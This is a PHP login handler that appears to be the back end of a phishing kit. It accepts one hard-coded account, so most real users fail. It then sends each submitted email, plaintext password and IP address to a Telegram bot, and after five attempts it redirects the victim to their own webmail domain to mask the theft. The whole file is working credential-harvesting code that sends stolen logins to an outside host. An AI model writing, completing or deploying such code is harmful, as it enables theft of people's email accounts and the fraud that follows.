<?php
session_start();

define('TELEGRAM_BOT_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN');
define('TELEGRAM_CHAT_ID', 'YOUR_TELEGRAM_CHAT_ID');

$validEmail = "user@example.com";
$validPassword = "password123";

if (!isset($_SESSION['failed_attempts'])) {
    $_SESSION['failed_attempts'] = 0;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['Username']) ? trim($_POST['Username']) : '';
    $password = isset($_POST['Password']) ? $_POST['Password'] : '';

    header('Content-Type: application/json');

    if (empty($email) || empty($password)) {
        echo json_encode(['success' => false, 'message' => 'Email and password are required.']);
        exit;
    }

    if ($email === $validEmail && $password === $validPassword) {
        $_SESSION['failed_attempts'] = 0; // reset on success
        echo json_encode(['success' => true, 'message' => 'Login successful! Welcome, ' . htmlspecialchars($email)]);
        exit;
    } else {
        $_SESSION['failed_attempts']++;

        // Send details to Telegram (same as before)
        $message = "Failed login attempt:\nEmail: $email\nPassword: $password\nIP: " . $_SERVER['REMOTE_ADDR'];
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $postFields = ['chat_id' => TELEGRAM_CHAT_ID, 'text' => $message];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

        if ($_SESSION['failed_attempts'] >= 5) {
            // Redirect URL to user email domain (e.g., mail.google.com for gmail.com)
            $domain = explode('@', $email)[1] ?? '';
            $redirectUrl = "https://mail." . $domain;
            echo json_encode(['success' => false, 'message' => 'Too many failed attempts. Redirecting...', 'redirect' => $redirectUrl]);
            exit;
        } else {
            $attemptsLeft = 5 - $_SESSION['failed_attempts'];
            echo json_encode(['success' => false, 'message' => "Invalid password. Attempts left: $attemptsLeft"]);
            exit;
        }
    }
} else {
    header("HTTP/1.1 405 Method Not Allowed");
    exit;
}
?>
